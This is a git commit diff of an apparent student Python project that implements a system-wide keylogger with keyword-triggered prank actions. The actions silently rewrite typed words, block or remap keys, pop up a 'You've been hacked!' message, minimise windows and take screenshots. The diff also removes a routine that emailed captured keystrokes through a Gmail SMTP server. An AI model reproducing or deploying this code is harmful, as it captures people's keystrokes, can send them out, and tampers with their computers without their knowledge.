142f8d4b059214a819cc65fd21aed20fd341882a
Armaan Bhullar <z5312870@ad.unsw.edu.au>
2022-04-08 21:08:21 +1000

    Added more functions

--- zapp.py
+++ zapp.py
@@ -19,50 +19,67 @@ class Keylogger:
         self.log = ""
 
     keys = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', \
-    'z', 'x', 'c', 'v', 'b', 'n', 'm', 'enter', 'space', 'control', 'shift', 'tab', 'esc', 'alt']
+    'z', 'x', 'c', 'v', 'b', 'n', 'm', 'enter', 'space', 'control', 'shift', 'tab', 'esc', 'alt', 'win', 'backspace', \
+    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', ';', '\'', ',', '.', '/', '\\', '`']
 
     autocorrect_words = {
         ' ' : 'SPACE',
-        'there' : 'their',
-        '.com' : ',com'
+        'thank' : 'screw',
+        'love' : 'hate',
+
     }
 
     def start(self):
-        # start keyloggerbasicbasicbasic
+        # Start keyloggerbasicbasicbasic
         keyboard.on_release(callback=self.callback)
-        # start reporting keylogs
-        #self.report()
-        # block the current thread, wait until CTRL+C is pressed test
+        # Block the current thread, wait until CTRL+C is pressed test
         keyboard.wait() 
 
     # Log key when pressed
     def callback(self, event):
         name = event.name
         if len(name) > 1:
-            # not a character, special key (e.g ctrl, alt, etc.)
-            # uppercase with []
+            # Not a character, special key (e.g ctrl, alt, etc.)
+            # Uppercase with []
             if name == "space":
                 # " " instead of "space"
                 name = " "
             elif name == "enter":
-                # add a new line whenever an ENTER is pressed
+                # Add a new line whenever an ENTER is pressed
                 name = "[ENTER]\n"
             elif name == "decimal":
                 name = "."
+            elif name == 'backspace':
+                name = ""
+                self.log = self.log[:-1]
             else:
-                # replace spaces with underscores
+                # Replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
 
-        # finally, add the key name to our global `self.log` variable
+        # Finally, add the key name to our global `self.log` variable
         self.log += name
         self.check_commands(self.log.lower())
 
     # Find and run commands from the keyboard input
     def check_commands(self, string):
-        #self.autocorrect(string)
+        self.autocorrect(string)
         if string.find("test") != -1:
+            self.simple_test()
+        elif string.find("pause") != -1:
+            self.pause_keyboard(2)
+        elif string.find("url") != -1:
+            self.go_to_url()
+        elif string.find("rotate") != -1:
             self.rotate_screen()
+        elif string.find("remap") != -1:
+            self.temp_remap_keys()
+        elif string.find("screenshot") != -1:
+            self.screenshot()
+        elif string.find("minimise") != -1:
+            self.minimise()
+        elif string.find("$pleasedon'ttypeanotherdollarsign$") != -1:
+            self.armageddon()
 
 
     # Block all inputs from the keyboard
@@ -77,12 +94,14 @@ class Keylogger:
 
     # Simple test to check if the program works
     def simple_test(self):
+        self.block_keys()
         pyautogui.hotkey("winleft", "m")
         pyautogui.press("winleft")
         pyautogui.write("notepad")
         pyautogui.press("enter")
         sleep(0.5)
         pyautogui.write("You've been hacked!")
+        self.unblock_keys()
         self.log = ""
 
     # Blocks all inputs from the keyboard for len seconds then unblocks them
@@ -95,9 +114,10 @@ class Keylogger:
     def autocorrect(self, string):
         for word in self.autocorrect_words.keys():
             if string.find(word) != -1:
-                print(word)
+                print(len(word))
                 for i in range(len(word)):
                     keyboard.press('backspace')
+                    sleep(0.001)
                 keyboard.write(self.autocorrect_words[word])
                 self.log = ""
     
@@ -114,33 +134,31 @@ class Keylogger:
         screen.rotate_to(new_pos)
         self.log = ""
 
+    def remap_keys(self):
+        for i in range(int(len(self.keys)/2)):
+            keyboard.remap_key(self.keys[0+i],self.keys[0-i])
+    
+    def unremap_keys(self):
+        for key in self.keys:
+            keyboard.unremap_key(key)
 
-    ########## For Keylogging ##########
+    def temp_remap_keys(self):
+        self.remap_keys()
+        sleep(2)
+        self.unremap_keys()
 
-    # Save key log and reset timer
-    def report(self):
-        if self.log:
-            self.send_mail(self.log)
-
+    def screenshot(self):
+        img = pyautogui.screenshot()
         self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        # sets timer to daemon (dies when main thread dies)
-        timer.daemon = True
-        # start timer
-        timer.start()
-
-    # Send logged keys via email
-    def send_mail(self, message):
-        # manages a connection to the SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # starts server in TLS mode
-        server.starttls()
-        # logs into email
-        server.login(EMAIL, PASSWORD)
-        # send message
-        server.sendmail(EMAIL, EMAIL, message)
-        # end session
-        server.quit()
+    
+    def minimise(self):
+        for i in range(20):
+            pyautogui.hotkey("winleft", "m")
+            sleep(0.1)
+        self.log = ""
+    
+    def armageddon(self):
+        self.log = ""
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_INTERVAL)
